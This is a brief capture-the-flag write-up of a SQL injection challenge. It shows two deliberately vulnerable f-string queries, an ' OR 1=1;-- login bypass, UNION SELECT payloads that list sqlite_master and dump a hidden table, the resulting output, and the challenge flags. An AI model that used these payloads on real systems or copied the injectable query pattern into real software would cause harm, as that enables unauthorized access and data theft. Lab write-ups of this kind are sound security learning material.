is this website vulnerable to sql injection? 

as it turns out, yes

```py
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
```

we were told to log in as user ```deafbeef```, so if we set the password as ```' OR 1=1;--```, we can login and get the flag

flag 1: deadbeef{th3_b33f_1s_d34f}

part 2's flag isnt immediately obvious, but we can find out what tables are in the database through another vulnerability:

```py
query = f"SELECT * FROM products WHERE id = {product_id}"
```

if we send the payload ```1 UNION SELECT sql, tbl_name, null FROM sqlite_master```, we see the following output

```
ID: 1, Name: Apple, Price: $5
ID: CREATE TABLE S3CR3t_t4BL3 (id TEXT, content TEXT), Name: S3CR3t_t4BL3, Price: $None
ID: CREATE TABLE products (id INTEGER, name TEXT, price INTEGER), Name: products, Price: $None
ID: CREATE TABLE users (username TEXT, password TEXT), Name: users, Price: $None
```

woah, S3CR3t_t4BL3 looks kinda suspicious, if we modify the above payload a bit

```
1 UNION SELECT id, content, null FROM S3CR3t_t4BL3
```

we can get the flag

flag 2: deafbeef{th3_b33F_1s_n0w_bl1nd}
